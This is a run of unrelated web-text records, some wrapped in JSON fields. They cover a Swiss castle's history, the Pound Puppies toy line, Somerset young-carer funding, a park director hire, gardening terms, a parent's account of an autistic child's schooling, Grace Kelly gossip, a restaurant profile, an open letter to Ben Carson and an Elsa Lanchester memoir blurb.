converted it into a boys' boarding school, which was known as the L\u00f6ffelschlyffi.  The school remained in operation until the depression of 1882, when the last director of the school, Jakob Enz-Allemann, had to sell the castles.  Two years later, his widow, Emilie Enz-Allemann, was able to reacquire both castles.  She sold the New Castle but converted the Old into a rental property with three small apartments on the ground floor and two larger ones in the upper story.  After her death in 1897, Hermann and Anna Enz inherited the castle.\n\nIn 1919, Hermann Enz and his sister Anna Enz sold the castle to the \"Gemeinn\u00fctzige Genossenschaft Altes Schloss B\u00fcmpliz\", a society that had been founded to preserve and maintain the castle.  They rebuilt the interior rooms and during the Great Depression used the castle to provide good, cheap food, a lounge and a library to the many jobless in the area.  Later they converted it into an alcohol free restaurant and a kindergarten.  In 1925, the castle was wired for electricity.\n\nIn 1954 the \"Gemeinn\u00fctzige Genossenschaft\" sold the Old Castle for about 80,000 CHF to the city of Bern.  An archeological dig in 1966 found such a wealth of artifacts, that in 1970 a team of twelve workers led by Werner Meyer, a professor at the University of Basel, spent ten weeks exploring the castle grounds and discovering the history of the castle.  However, above ground the buildings were not maintained, and continued to decay.  On 19 November 1976 a fire destroyed the roof of the castle.\n\nIn 1979/80 the Castle was rebuilt at a cost of about 3 Million CHF.  The gate was reopened in the gatehouse, a portion of the moat was excavated and a drawbridge added.  The windows were rebuilt in the baroque style and the burned roof was rebuilt as close to original as possible.  The north-west wing was rebuilt, while the north-east wing was recreated in concrete and glass.  A restaurant opened in the north-east wing, the gatehouse and the courtyard.  The rest of the building was converted into the B\u00fcmpliz village archives and into meeting rooms or offices.\n\nSee also\n List of castles in Switzerland\n\nReferences\n\nExternal links\nB\u00fcmpliz Castle information\nOfficial website of the Castle\n\nCastles in the Canton of Bern", "meta": {"redpajama_set_name": "RedPajamaWikipedia"}, "__index_level_0__": 50564}

{"text": "Pound Puppies is a toy line that was created by Tonka in the 1980s. It later inspired an animated TV special, two animated TV series, and a feature film. Shipments of the toys over five years generated sales of $300 million in 35 countries.\n\nToy description\nThe puppies were a variety of plush stuffed dog dolls with floppy ears and droopy eyes. They came in a variety of colors (gray, brown, white), some with spots. Each one came in a cardboard case shaped like a doghouse with an \"adoption\" certificate. The tagline was \"Loveable Huggable\". Smaller versions were also created (approximately 5 inches (13\u00a0cm) long), and a line of cats called Pound Pur-r-ries was also released. Each authentic toy puppy had a heart-shaped or a bone (on the very first edition puppies) emblem near its tail that sported a \"PP\" logo with either a dog (Puppies) or cat (Purries) peeking above it.\n\nToy history\n\nNorth America\n\nThe toys were created by Mike Bowling in 1984. The first puppies were sold by Irwin Toy in Toronto, Canada. After Irwin, the line was produced by Tonka which introduced them to the U.S. market.\n\nIn 1987, Hardee's and Pizza Hut restaurants also offered a series of Pound Puppies with their Children's Meals. Other products besides stuffed toys were made such as Little Golden Books, coloring books and miniature figurines.\n\nPound Puppies continued to be popular in the early 1990s. The toys were produced again in the early 2000s and included specific breeds of dog (as opposed to a generic model) along with barking sounds and movements.\n\nThe toyline was discontinued in 2002; however, the 2010 series of the same name was produced by Hasbro Studios and aired on The Hub in 2010.\n\nThe toy line was relaunched in 2014 by Funrise and they are still available in stores today. In 2019, they were reintroduced again. This time, being sold by Basic Fun! in stores featuring normal sizes and baby sizes. They previously sold jumbo sizes as well.\n\nOther regions\nIn South America in the 1980s the toys went by the name Snif Snif (an onomatopoeic brand). Makers under license included Brazil's Estrela, Argentina's Antex, and Peru's BASA. \n\nIn France they were known as Les Pitous (individual dolls going simply by the singular Pitou). The toys were made by Vulli under license.\n\nIn Germany they were known as Wauzi (Pound Purries were also sold as Miauzi). \n\nIn Italy they were known as Cercafamiglia, and were made by Harbert\n\nIn the United Kingdom Pound Puppies was distributed by Hornby Hobbies\n\nTV special\n\nA TV special based on the toyline was released in October 1985 by Hanna-Barbera. It ran in syndication, paired with Star Fairies. In the special, a female dog named Violet Vanderfeller is dognapped and ends up at the city pound. The Pound Puppies attempt to and end up succeeding in reuniting Violet with her family. The special was released in 1986 on VHS by Family Home Entertainment and is also available on DVD. The DVD comes with certain Pound Puppies toys.\n\nTV series\n\n1986 TV series\n\nAfter the TV special became successful, Hanna-Barbera gained the rights to create an animated TV series. The series was broadcast on ABC from September 1986 to February 1989. While the series was loosely based on the special, it made no mention of the character Violet. The Pound Puppies who were featured also underwent re-designs from the TV special. When the program was renewed for a second season, there were major style differences and the series was retitled All New Pound Puppies.\n\nCharacters\nSee List of Pound Puppies characters\n\n2010 TV series\n\nAnother television series, this time produced for Hasbro Studios, was premiered on the Hub Network (now Discovery Family; partly owned by Hasbro since its launch) on 10 October 2010, the channel's launch date. The characters are based on the current version of the Puppies which Hasbro released in the summer of 2012. In addition, there was an online website where one could download a Pound Puppies adoption certificate. On 9 July 2012, Pound Puppies was one of four original animated series from The Hub to win the CINE Golden Eagle Award for its high quality production and storytelling. In August 2012, the season one episode \"I Never Barked for My Father\" was awarded the Humanitas Prize for excellence in writing for children's television animation.\n\nFeature film\n\nIn 1988, TriStar Pictures released a Pound Puppies movie titled Pound Puppies and the Legend of Big Paw. It was produced by Atlantic Releasing, Carolco, Family Home Entertainment and Kushner-Locke with The Maltese Companies.\n\nIt was panned by critics, and poorly received at the box office. Shoddy animation, character inconsistencies and a color palette that differed from the show's were among the chief complaints.\n\nFans were also confused by the apparent romantic pairing of Nose Marie and Cooler, which contradicted events that had taken place in the first season of the series. In addition, the plot is set in the 1950s with the story being narrated by Whopper, who in the present day is an older dog who tells the story to his nephew and niece.\n\nReferences\n\nExternal links\n Pound Puppies at Galoob (Archive)\n\n \n1980s toys\nFictional dogs\nProducts introduced in 1985\nStuffed toys\nTonka brands\nToy animals", "meta": {"redpajama_set_name": "RedPajamaWikipedia"}, "__index_level_0__": 24867}

They aim to reach more young people, working with and funding the voluntary and community sector provide them with more support and activities.\nThere are an estimated 1,750 young carers in Somerset but at any one time the Council's existing arrangements only support around 150. The decision taken yesterday will maintain the current level of funding of \u00a3248,000 and see a focus on identifying young carers not currently receiving support, linking with schools and others.\nYoung carers will have a key role in deciding how the group sessions and activities are organised, as well as the distribution of \u00a353,000 of grants to voluntary, charity and community groups to provide activities.\nThese voluntary organisations and groups will also be able to access other sources of funding not open to the Council, helping them fund more activities. Research shows there are up to 20 funding sources they should be eligible to apply to on behalf of young carers.\nA sum of \u00a375,000 is being made available to help develop a 'community alliance' of organisations providing young carers support, while \u00a3120,000 will be budgeted for dedicated support to young carers with more complex needs.\nA spokesperson for Somerset County Council said: \"We're confident that these arrangements will enable us to support more young carers and support them better.\n\"We've seen elsewhere that working with the voluntary and community sector can work really well and that is what we want to see happen here.\"\nIn September last year, the Council's Cabinet deferred a decision on the future of support for young carers. This was to allow detailed proposals to be worked-up about how it could be redesigned and establish the capacity of the voluntary sector to provide this kind of support.\nIn the meantime, existing support and activities have continued. Workshops and events have also taken place with young carers to understand what's important to them, and with voluntary organisations and interest groups to see what they may be able to provide.\nThe report detailing the proposals considered by Cabinet can be found on the Council's website (http://democracy.somerset.gov.uk/ieListDocuments.aspx?CId=134&MId=735&Ver=4)\nsomerset county council\nA healthier Somerset fit for the future\nCar 'severely damaged by fire' on Staplegrove Road, Taunton\n21st September 2015 0\nDriver loses control of vehicle on Hope Corner Lane, Taunton\n23rd March 2015 0\nCopyright \u00a9 2019 | Apple FM CIC", "meta": {"redpajama_set_name": "RedPajamaCommonCrawl"}, "__index_level_0__": 68563}

The hiring comes after many years of concern about the day-to-day management of Rye Town Park and the adjacent Oakland Beach. The position of park director is seasonal and requires a unique blend of program planning, operations, and people skills. Vargas was selected from a pool of twelve candidates who made it through the first screening, and one of two who was interviewed by the entire Commission.\nMr. Vargas received a Bachelor of Science degree in Sports Management from the State University of New Jersey. His extensive background includes stints as a camp counselor, camp director, community relations coordinator, park manager, and athletic league manager. He has worked with the New York Police League, The New York City Parks Department, and the Randall's Island Sports Foundation. Vargas will supervise maintenance, security, parking, the cashier, and lifeguard staff at the park.\nThe paper got a chance to catch up with Vargas by phone. Having recently moved from New York to White Plains, he \"has fallen in love with Westchester\" and is thrilled with the opportunity to work summers in such a beautiful setting. A self-described people person, he looks forward to getting to know the patrons of the park and underscored his desire to run the park with an \"open door policy.\"\nReflecting on the hire, City Councilwoman Emily Hurd said, \"Laurence's energy, enthusiasm, and professional experience made him the best candidate.\" Mayor Josh Cohn elaborated on this very point. \"His work at The Randall's Island Sports Foundation, uniting multiple communities all of which were interested in using the park facilities, made his experience stand out among the candidates.\"\nRye Town Park serves four communities, Rye Brook, Rye Neck, Port Chester, and the City of Rye, and is governed by six commissioners, including the three mayors and the Town Supervisor. Mayor Cohn and Councilwoman Hurd represent the City of Rye on the Commission.\nVargas officially joined the staff March 1.

{"text": "Making theatre with the young residents of the Cook County Juvenile Detention Center is transformational- not just for them- but for all of us who are lucky enough to know them, love them, and work with them. Though many of the young people have survived incredible difficulties, there's open-heartedness, goodness, and a willingness to stretch way outside their comfort zone to collaborate and create theatre.\nSome newcomers begin our sessions with downcast eyes, sad or distressed about their cases, withdrawn from their peers. We often see big changes in just 2 hours together. Witnessing the power of the ensemble members to comfort and inspire each other is one of the great joys I have experienced in my professional life. We often see young people grow to become mentors for the new arrivals to the ensemble.

{"text": "Nursery professionals tend to use words that can sometimes be confusing. Here is some insight into this jargon so that on your next garden center visit you can be more efficient with your time and feel more intelligent.\n\u2022A typical garden center sells all kinds of plants that usually include annuals, perennials, evergreen and deciduous woody shrubs, and vines and ground covers. It may not always be obvious which is which or how to use them in our gardens. Probably the most common plant in the Northwest is what we refer to as an evergreen. For most gardeners the word \"pine\" immediately comes to mind, and that is fine except that most evergreens on the west side of the mountains are either firs, hemlocks or cedars. Add to that group all the exotic varieties of evergreens \u2013 like cypress, juniper, spruce, cryptomeria, sequoia, thujopsis and sciadopytes \u2013 and it can get confusing. All you need to remember is that these are what garden centers refer to as needle-leafed evergreens or conifers. They are mostly trees but can also be shrubs, or even low-growing ground covers. \u2022The other typical type of evergreen is what we call a \"broadleaf.\" It is usually a shrub like a rhododendron, azalea or camellia, but could also be a small tree like holly or English Laurel. The leaves are broad, rather than needle-like, and will usually grow in either full sun or shade. They are very adaptable and great in many different garden or landscape spaces.\n\u2022Annuals are plants that sprout from seed, grow, flower, set seed and then die, all in one season. While that is technically true, there are many kinds of plants that we as gardeners treat as \"annuals\" and enjoy for one season and then part company. Geraniums for example will grow into a hedge down in Southern California where I grew up, but in the Northwest we treat them as a seasonal pleasure. Even woody shrubs like lantana or bougainvillea can be used as annuals here and then relegated to the compost pile at the end of the season. Some of you may recall me referring to that behavior as a summer love affair. Annuals have many uses but are perfect for adding vibrant pops of color in containers on patios and porches.\n\u2022Perennials are plants that come back every year (at least they are supposed to) and usually disappear for the winter. They can be ground huggers or 6-feet tall giants, shade lovers or sun hoggers, moisture needers or drought requirers and some even can be evergreen and never die back in the winter at all. In other words, they come in all shapes and sizes and can provide us with endless hours of entertainment. Perennials are perfect for creating interesting, colorful, ever-changing garden beds.\n\u2022Finally, vines are plants that will climb up a tree or trellis and form a vertical accent in the garden. They can be either evergreen or deciduous, perennial or annual, shade or sun loving, and are a wonderful addition to any garden. They are particularly great for growing on (or covering) fences, arbors or trellises. Hopefully some insights have been gained on these different plant categories, and you'll feel more confident when perusing for your gardening needs this year.\nSteve Smith is the owner of Sunnyside Nursery in Marysville.

{"text": "I didn't really know what school to pick for Charlie, because I didn't know initially if he was intellectually impaired or not. I got a lot of support from kindergarten teachers and experts, to help me pick the right school [a nearby mainstream Catholic school]. And I really listened to the people I trusted on that, rather than throw him into a school where he was out of his depth.\nI had a friend who had a child with a mild disability. And she was really well supported at the school. And when I was at the school, I met some children who were a bit further down the track, who also had disabilities. And they were really happy, so that was a good sign.\nOne of the reasons I chose the school was because I had friends at the school. School friends, school parents are a big part of our social life, and that's really important to our family. And when there has been issues with him socially, I've been able to ring up a friend, instead of ringing the school, and deal with it that way. Some weeks Charlie will just want to play by himself, and he doesn't quite know how to break into social interactions again with other children. I just pick up the phone and ring a friend, and then they tend to include him again.\nWhen Charlie first started school, I made a booklet about him and his condition, and where he was at. And I gave that to the school, and they really appreciated that, because it helped them understand him better, and his teacher was able to help him more during the year.\nThe school and I have worked together with Charlie. They seem to appreciate parents who are more proactive, by getting him diagnosed fairly early, and having done a lot of work before he started school. Without the early intervention, Charlie probably would have been non-verbal when he started school. So they were really grateful that I had put in some hard yards in prior years.\nI keep in touch with the school via the principal or the teachers. I keep in regular contact with them \u2013 having a chat if there's an issue that's come up, and something that needs to be dealt with on the spot. If I need to talk to the principal I'd make an appointment, and if I need to talk to the teacher I try and speak to them first thing in the morning, or just make an appointment.\nI touch base with the school once every semester, with the Parent Support Group teacher, his aide and his teacher. And we have a little round-the-table meeting about where he's at, and any issues that he has. And often they're just social issues. Not usually academic issues any more. Whatever is happening at the time.\nIt's been important for me to be his advocate, because if I didn't do it, no one else would! When I'm dealing with people, I try and deal with them in the most positive way possible, and sometimes they don't see solutions for him. I might have to bring some in.\nWhen I go to a meeting for my son, I try and go in there with a couple of solutions, if there's a problem. One of the issues that my son has, was he started to pull out his hair, which was a nervous anxiety condition. And I'd actually had that condition as a child, so I brought my own experience in, and I wrote a brochure about the condition, gave it to the school, and suggested giving him a necklace that felt a bit hairy \u2013 something that he could play with, to stop him from pulling out his eyelashes and hair. So they didn't know about the condition, and they were really grateful, because many children suffer from hair-pulling and similar types of nervous condition. So it just made the teachers all aware, and the principal was really supportive.\nIn grade 1, that was a really important year for Charlie, because it's not as touchy-feely as prep. So I decided to help out in the classroom, to learn from the teacher how I could help teach him, because I don't have a teaching background. And also to see how he was going socially, and see where he was having difficulties.\nWithin that, I made some resources for the classroom to help him and some other children that were struggling with things, for instance doing words, adjectives. I made a booklet for his classroom, and that helped him get through some difficulties in the year.\nBeing in the classroom, I developed a good relationship with his teacher. Just being there really helped her and I work on strategies for Charlie together.\nIt was hard at the beginning when Charlie was diagnosed, because I didn't really want to accept that he had a disability. But I didn't have a choice, and I came round to the idea of helping him fairly quickly. Early in the process, I was told that the buck stopped with me, so I had to look out for him. I think the way I coped with it was just getting as interested in his condition as possible, and making it a big part of my life, and probably mono-talking autism to my friends for about two years!\nCharlie being diagnosed with autism has just changed my life completely. I've learned so much now, I want to help other families. I've applied for uni next year.\nOne of the things that has really changed for me since my son got diagnosed is that I do take some more time out for myself, when I can. And my thing that I do for myself is to keep as fit as possible, and that's completely changed for me.", "meta": {"redpajama_set_name": "RedPajamaC4"}, "__index_level_0__": 50598}

{"text": "James Spada's Hollywood\nJames Spada is a celebrated author who has written many books on Hollywood and the personalities behind its magic. James is a Hollywood insider who brings a fresh and intimate approach to his celebrity insights.\nGRACE KELLY AND RAY MILLAND'S AFFAIR WHILE FILMING \"REAR wINDOW\"\nGrace soon found herself enmeshed in a sexual imbroglio, but it had nothing to do with Hitchcock. Her forty-nine-year-old co-star Ray Milland was another highly attractive leading man, an Oscar winner in 1945 for The Lost Weekend, and powerful and well liked in Hollywood. The fact that he was married did little to dampen twenty-three-year-old Grace's ardent interest.\nMilland had married the former Murial Weber in 1932, and they had a son, Daniel, born 1940, and a daughter, Victoria, adopted in 1949. Like Gary Cooper, however, Milland appreciated women other than his wife, and he often succumbed to temptation. He was particularly susceptible to Grace's considerable charms, and he fell hard. So did Grace. \"It was very serious between Ray and Grace,\" [Grace's sister] Lizanne recalls. They began to see each other, making little effort to conceal their romance. \"I was aware of it,\" Mel Dellar says. \"My wife and I saw them out having dinner a couple of times, and late in the evening, after we finished filming, they'd go to some little place and have a few drinks.\"\nMilland surprised Lizanne one day by confiding the depth of his feelings for Grace to her. \"I flew back from Hollywood on the same plane with him,\" she recalls, \"and we had a long talk. He told me he really was very much in love with her.\"\nGossip in Hollywood spreads faster than Southern California fires whipped by hot Santa Ana winds, and Milland's wife, known to her friends as Mal, soon heard talk about her husband and this beautiful newcomer. She feared it was true, but there was no proof. Several weeks after her suspicions were first aroused, her fears were confirmed. A close friend of the Millands, who requested anonymity, recalls: \"Jack\u2014his friends call Milland 'Jack'\u2014 was going on a trip, and he had just left the house. Mal's sister Harriet was there, and Mal poured her heart out to her about her suspicions. Harriet got in her car, followed Jack to the airport, and sure enough, there was Jack with Grace, going off on a tryst somewhere.\"\nThe Millands separated; Grace and Ray discussed marriage. He took an apartment in Hollywood and Grace spent a great deal of time there. Teet Carle, a publicist at Paramount at the time, says, \"I don't know if they were living together, but the story got back to me that someone from the studio went over to Ray's apartment and Grace answered the door.\"\nGrace's indiscretion soon became common knowledge in Hollywood, and she was unprepared for the animosity directed toward her. Mai Milland was extremely well liked in this company town; she and Ray had a family, and none of their many friends wanted to see the marriage destroyed. A tearful late-night telephone call from Mrs. Milland to Louella Parsons about \"this young girl who's trying to steal my husband\" did little to help Grace's cause.\nIt wasn't the publicity, which the veteran Milland was more used to and less affected by than Grace was, but rather his realization of the impracticality of his divorcing Mal that caused Milland to reconsider. Studio publicist Andy Hervey recalls that Mrs. Milland had an ace up her sleeve: \"Mal told Ray, 'You go ahead and get a divorce and marry Grace Kelly. That's okay with me, because all the property is in my name.' Needless to say, it wasn't long before the marriage plans were off.\"\nThe previously quoted friend of the Millands adds, \"Jack finally came to his senses and realized that he had a wonderful woman in Mal\u2014and of course, they're still together to this day.* Mal still refers to the Grace Kelly period as 'those agonizing days.'\"\nNot only was Milland being pressured to break off the romance, so was Grace by her family.family. After the Cooper and Gable \"situations,\" Jack Kelly had asked publicist Scoop Conlan, a family friend, to \"keep an eye on Grace,\" and Conlan reported back to him about his daughter's latest potentially embarrassing liaison. The Kellys were very displeased. \"My father was concerned about Ray Milland,\" Kell said later. \"He didn't like what he had heard about him.\" Jack Kelly himself huffed to a reporter a short time later, \"I don't like that sort of thing much. I'd like to see Grace married. These people in Hollywood think marriage is like a game of musical chairs.\"\nLizanne recalls, \"In our family at that point divorce was not the thing to do, and going out with a married man or a divorced man was a no-no. If Milland had been single, things might have been different.\" Once again, Mrs. Kelly flew to Hollywood to make sure her daughter kept her head. Jack Kelly later said, \"She and Scoop sat down and talked things over with Grace. They found her willing to listen.\"\n\"My mother and father were very strong-willed people,\" Lizanne says, and they convinced Grace that she simply had to drop Ray Milland. \"Grace came to realize that Ray hadn't quite gotten over his wife, and that it was wrong for her to be the cause of his divorce. That was the main reason Ray and Grace never pursued it.\"\nThe gossip in Hollywood about Grace and Milland was so fierce\u2014and the reaction so virulent\u2014that both Grace's own studio and Warner Brothers feared a tidal wave of bad publicity that could harm her very promising career. Robert Slatzer recalls, \"In those days the studios would routinely pay off reporters to keep unsavory things out of the newspapers. In Grace's case, it got to be very expensive because the studios were always buying off journalists in order to keep her image pure.\"\nA few gossip column items did appear, but it was always possible to dismiss these as exaggerations of a few innocent dates. One publication that couldn't be bought off, however, was Confidential, the Enquirer of its day, and before long the magazine blew the whistle on the Kelly/Milland liaison in a salacious account that caused Grace deep consternation and public humiliation. In its colorful style, the magazine detailed Ray's infatuation with Grace and the domestic discord it caused: \"After one look at Gracie he went into a tailspin that reverberated from Perino's to Ciro's. The whole town soon hee-hawed over the news that suave Milland, who had a wife and family at home, was ga-ga over Grace. Ray pursued her ardently and Hollywood cackled. Then mama Milland found out. She lowered the boom on Ramblin' Ray and there followed one of the loudest, most tearful fights their Beverly Hills neighbors can remember.\"\nGrace was shaken. She had never experienced the glare of the spotlight in quite this way before. Perhaps Confidential could be dismissed as a rag, but disapproving tidbits soon began turning up in respectable newspapers as well. \"I felt like a streetwalker,\" she told an interviewer later.\nA good deal of the resentment against Grace in Hollywood stemmed from what many saw as the hypocrisy of her Goody Two-shoes image in light of her healthy sexual appetite. Mrs. Henry Hathaway, the widow of Grace's first motion picture director, feels bitter toward Grace to this day. \"I have nothing good to say about Grace,\" she says. \"She had an affair with my best friend's husband, Ray Milland. And all the time wearing those white gloves!\" Asked whom else in Hollywood Grace may have had affairs with, Mrs. Hathaway replies, \"You name it. Everybody. She wore those white gloves, but she was no saint.\"\nMany in Hollywood shared Mrs. Hathaway's feelings. They mocked Grace as \"Little Miss Prim and Proper.\" Columnist Kendis Rochlen cackled in the Los Angeles Mirror-News, \"She's supposed to be so terribly proper, but then look at all those whispers about her and Ray Milland.\"\nHollywood's reaction to Grace's behavior upset her deeply. She never looked upon her frequent sexual dalliances as promiscuous\u2014and they were not, in the true sense of the word. They were neither indiscriminate nor casual. When Grace gave herself to a man, it was, as Don Richardson has said, because of a deep-seated desire for affection and acceptance from father substitutes, much more than the physical delights of sex. And, more often than not, she felt herself truly in love before she would have sex with a man. She wanted to marry Ray Milland, and the fact that her conviction that he would leave his wife and marry her was rooted more in naivete than reality does not make it any less genuine.\nPosted by James Spada at 2:00 PM\nOneEighthWhiteBodewadmi February 19, 2013 at 10:45 AM\nMr. Spada, you do mean during the filming of Dial 'M' For Murder, don't you?

By the time \"Dial M For Murder\" was filming,Grace Kelly was notorious for \"sleeping\" with all of her male costars. Gloria Stewart made sure to be on the set of \"Rear Window\" every day that her husband Jimmy and Grace were scheduled to be working together. Cary Grant's wife, Betsy, became friends with Grace, so that left him off the hook. Unfortunately for the wives of Bill Holden, Gary Cooper, Fred Zinneman, Bing Crosby, etc., they were not as savvy or aware of Grace's easy virtue!\nI do admire Ray Milland and appreciate how he kept his love for Grace private and didn't disclose any bit of information or rumor about their affair. I truly believe the way things turns out where everyone was aware of their romance, that he didn't profit from her.

We were fortunate to spend the afternoon of the fourth, enjoying good food with some good friends here at our home. We enjoyed homemade grilled pizzas, courtesy of Brad's awesome dough making and grilling abilities. Our guests brought some yummy bruschetta and a huge fruit salad with cinnamon and sugar chips. Everything was delicious and proved to please our small, \"choosy\" crowd (two toddlers and an elementary school-aged child). We ended the evening with some of my homemade, vegan chocolate coconut \"ice cream\". We were without the traditional fireworks display, but have grown accustomed to that living here in Germany. Instead, we actually enjoyed watching some extravagant firework displays on YouTube (yes, sad, but true). They proved to be helpful as we teach Nathan about the home in our hearts, America.\nThe second celebration of the weekend was the Sektfest here in our town of Eltville. The Champagne Fest is held every summer and draws in a big crowd. The city claims that its goal is to make the fest \"family friendly\", but it really is an event for those without children (it is a Champagne Fest after all! ). I think we saw one carousel and a man selling mylar balloons. There was, of course, more than enough vendors selling kid-friendly treats, but the focal point was the Champagne, wine and sparkling wine the region is known for. We did not indulge in any of the bubbly, but did enjoy yet another cultural experience here in the Rheingau Region of Deutschland.", "meta": {"redpajama_set_name": "RedPajamaC4"}, "__index_level_0__": 27568}

{"text": "I arrive at Kathy's Restaurant on a Monday morning around 9:30 a.m. Immediately greeted by a friendly hello from a waitress, I take in the 1950's style dining room, complete with black and white check tile, a classic soda fountain counter, and memorabilia of a bygone era. There is a breezy sound of easy conversation in the air, a laugh at a joke between older men, a giggle from a boy trying to fit a too big bite of scrambled eggs into his smiling mouth. I have an immediate sense that I'm in store for more than just breakfast \u2013 there's an experience waiting.\nI'm led by a kind-faced waitress to a table in the large, bright dining area to the left of the diner space. Decorated in an elegant but unpretentious country-style, it immediately translates as cheerful. To my right, a brother and sister are out to breakfast with their elderly parents, in the corner a middle-age father listens intently to his teenage son interrupted only by a proud grin, a young family with two kids are deciding which pancakes to order \u2013 blueberry or apple.\nI notice the waitress places her hand on the shoulder of a woman while asking if she needs anything and try to put my finger on the sentiment. I realize where I've seen this before. In this place people care about people and show it by the food they serve and by taking excellent care of you. The food is fresh, the recipes are tried and true, and the kindness is effortless \u2013 like going home to grandma's house.\nKathy's Restaurant is a place with a pulse, a heartbeat, and an authenticity that makes it standout. Places like this don't just happen \u2013 someone has the vision, the perseverance, and the ambition to create it. At Kathy's Restaurant, the driving force is owner Kathy Lacey of Waynesboro, Virginia.\nRaised with her sister in a devoted Christian household, high value was placed on hard work and doing your best. Marriage and children came early, and Kathy was already an experienced waitress at nineteen. With a shared passion for the food and service industry, the couple embarked on several restaurant endeavors through the years.\nEventually, Kathy was determined to open a restaurant of her own. The idea for Kathy's Restaurant, a gathering place that's more an extension of home than a restaurant, was born. Kathy set her sights on the Greenville Avenue property in Staunton as the location even though it was known for its hit and miss businesses. \"People said they hoped I made it here because no one has ever made it here,\" Kathy remembers.\nLocation concerns coupled with the high restaurant mortality rate could have deterred even the bravest of heart \u2013 but not Kathy. Instead, she forged ahead with her plan in an era when women entrepreneurs were pioneers in a male-dominated business world. To support her family financially, she decided to simultaneously flip houses, before the HGTV era made it trendy, while also opening the restaurant.\nEarning the trust and respect of the community, Kathy flipped 150 homes in Staunton \u2013 mostly in the downtown area. Kathy credits her faith for the tenacity to open a new restaurant and flip houses at the same time. \"I had faith to believe that if I did the right thing consistently, I had to be successful. I really did believe that. It doesn't mean you're not going to have tough times. I had many tough times, but I kept believing,\" she explains.\nAlso known for the holiday-inspired decorations, especially at Christmas, Kathy has a special reason for keeping up the tradition. It turns out many of her older customers don't have Christmas trees or decorations at home. For many of them, Kathy's is where they get in the Christmas spirit.\nReflecting on her formula for success, Kathy explains, \"My goal is to provide great food at affordable prices, pay my employees a fair and good wage, and to treat people the way I want to be treated.\" Staff and customer loyalty are proof that she's hit the mark. Poignantly, Kathy adds that for some customers, especially older ones, an outing to the restaurant may be the only social activity of their day. Whatever the age, it's easy to see why people return again and again.\nHow lucky we are that Kathy Lacey decided to bloom here in the Shenandoah Valley.\nKathy's is our place. We have been taking our son there since he was little. They have watched him grow into the young man he is. Now him and his girlfriend go there every weekend for breakfast. Thank you to Kathy and her staff for helping us make family memories!\nI have never, ever once had a bad experience with the food or service here.\nJust where is Kathys restaurant ???\nGreat question! Kathy's Restaurant is located at 705 Greenville Ave in Staunton.", "meta": {"redpajama_set_name": "RedPajamaC4"}, "__index_level_0__": 67548}

I see an underlying philosophical trend among many of you Republican candidates, whether on issues around immigration, issues of equity between genders and sexual identities, and issues of religion.\nOnce people like yourselves have entered the doorway of opportunity, you attempt to close the door in the face of others. All of the candidates are citizens of the United States, so now you want to close the door of citizenship to others. Since you all have quality healthcare, you want to take it away from the estimated 16 million people who now have health insurance for the first time under the Affordable Care Act. Though you may assume that all presidents since George Washington have followed Christian faiths \u2013 though some have defined themselves instead as \"Deists\" \u2014 you want to close the door of the office to anyone other than those of you with verified Christian credentials.\nDr. Carson, you are running for the presidency by standing on the shoulders of the brave and tireless pioneers who came before you who made it possible for you and for Mr. Obama. I still remember seeing on television the lunch counter sit-ins, the voting rights registration drives, the \"Freedom Schools,\" the marches, and the many other forms of civil disobedience aimed at abolishing discriminatory and abusive \"Jim Crow\" laws, which advanced and strengthened white supremacy by maintaining segregation and withholding the ballot from people of color.\nYour statements and those of many of your challengers on the Republican side of the political spectrum are replicating discriminatory policies by advancing and strengthening Christian supremacy by maintaining segregation and withholding opportunities from non-Christians, in particular, Muslims. How \"Constitutional\" Dr. Carson are these actions?\nIn your book you write: \"And as someone who has performed brain surgery thousands of times, I can assure you that the Constitution isn't brain surgery.\" Well, Dr. Carson, maybe you need rethink your candidacy, and instead keep your day job, since you understand much better the structures of the brain instead of how to use it to defend and preserve the Constitution of the United States of America.\nat the homecoming game and roots for the otherside. Get your attention elsewhere.\nTo Joey: I find your response disappointing at best, for hate begets hate begets hate, and the chances for peace remain elusive, and the cycle of hate continues.\nnon-inclusive, even unkind attitudes and/or actions toward other religions and/or peoples. The majorityof people, howeveer,favor the loving, inclousive expressionns of their faith and/or tradition. This is true of Jews, Muslims,m Christians andn others. We3 must judge each candidate as an individual, and examine what his actions and views have been.\nI am generally pretty pessimistic and critical. However I find myself between Warren and Howard in regards to my hope for humankind. Being in the middle is rather unfamiliar territory for me. Thanks.\nYou stated that you are really confused. I can believe that. Let me try to shed some light here.\n1. It was not Mr. Trump's duty to correct statements made by members of the audience. Period.\n2. Dr. Carson gave an honest answer to a simple question. Period.\nChester: If Donld Trump had been a true leader, he would have corrected the audience member, like John McCain before him who was confronted with a similar audience member. Period. Dr. Carson's \"honest answer\" does not square with the Constitution of the United States, which if elected president, he would have to protect and defend. Honesty does not forgive bigotry. Period.\nWow. What a breathtaking disappointment.\nI was very encouraged by Dr. Carson early on. Then the immigration thing. Ok, perhaps a matter of opinion, and not a game-changer for me. But this. My word.\nThe first election I remember was when JFK ran. Remember? Papal Infallibility. The Pope was going to run America. Al Smith reincarnate.\nObviously a Catholic was a mistake.

Born to radical socialist parents, Elsa attended an all-boys school and later \"studied\" in Paris with dance pioneer Isadora Duncan. At 17, she opened her own theater, which was frequented by writers such as H. G. Wells, Aldous Huxley, and Evelyn Waugh. She began performing with and then fell in love with a brilliant young actor named Charles Laughton. Soon after their marriage he revealed his homosexuality. Though it made their union shaky at times, it did not overshadow their common love of art, music, and nature, and their marriage endured for 36 years until Laughton's death. Elsa Lanchester, Herself presents the story of a woman ahead of her time: independent, iconoclastic, liberated. It is the chronicle of a life filled with famous people (from Bertolt Brecht to Henry Fonda), and of a career that spanned almost seven decades. It is also a warm, truthful account of a very special marriage. Witty and wise, Elsa Lanchester's account of her life and times is a delight.\n\"A book every actor should read.\" \u2014Mara Wilson, from her foreword\n\"The story of a remarkable woman and even more remarkable marriage, told in an engaging, straightforward, unaffected style.\" \u2014Publishers Weekly\n\"A wise, witty and at times deeply touching autobiographical account of the life of the English gamine who grew up to be one of Hollywood's most delightful comediennes and the wife of one of its greatest, and most tortured, actors. Elsa Lanchester tells without fear or favor how she and Charles Laughton managed\u2014and ultimately came to rely upon and take refuge in\u2014the uneasy marriage that Charles' homosexuality placed in jeopardy almost from the day it began. Here are all the fascinating people Elsa associated with in the course of her fabulous career\u2014and the unflinching record of the unbreakable strength that permitted one who accurately describes herself as 'a survivor' to create for herself an individual life and career that have given her a permanent place in the list of filmdom's greatest actresses.\" \u2014Allen Drury, author of Advise and Consent\n\"A very special person tells a special tale of an extraordinarily special life and she tells it brilliantly in her own special way.\" \u2014Vincent Price\n\"Reading Elsa Lanchester, Herself allowed me to have a renewed interest and respect for the talented actress who will forever be a part of the beloved Universal Monsters and their 